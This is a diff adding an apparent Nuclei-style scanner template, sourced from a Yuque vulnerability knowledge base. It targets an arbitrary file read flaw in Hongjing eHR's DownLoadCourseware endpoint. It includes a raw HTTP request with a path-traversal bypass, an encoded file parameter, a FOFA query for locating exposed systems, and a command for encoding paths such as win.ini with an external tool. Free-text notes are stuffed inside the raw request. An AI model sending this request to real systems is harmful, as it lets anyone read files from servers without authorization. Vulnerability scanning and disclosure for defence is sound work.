@@ -1,0 +1,38 @@
+id: poc-zgcxzvu88c41dm7f
+info:
+  name: 宏景eHR DownLoadCourseware 任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zgcxzvu88c41dm7f'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zgcxzvu88c41dm7f
+    fofa: app="HJSOFT-HCM"
+http:
+- raw:
+  - 'GET /w_selfservice/oauthservlet/%2e./.%2e/DownLoadCourseware?url=VHmj0PAATTP2HJBPAATTPcyRcHb6hPAATTP2HJFPAATTP59XObqwUZaPAATTP2HJBPAATTP6EvXjT HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate, br
+
+    Connection: close
+
+
+    读取文件内容需使用工具编码
+
+    工具地址：[https://github.com/vaycore/HrmsTool](https://github.com/vaycore/HrmsTool" \o "https://github.com/vaycore/HrmsTool)
+
+    java -jar HrmsTool.jar -e C:/Windows/win.ini'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
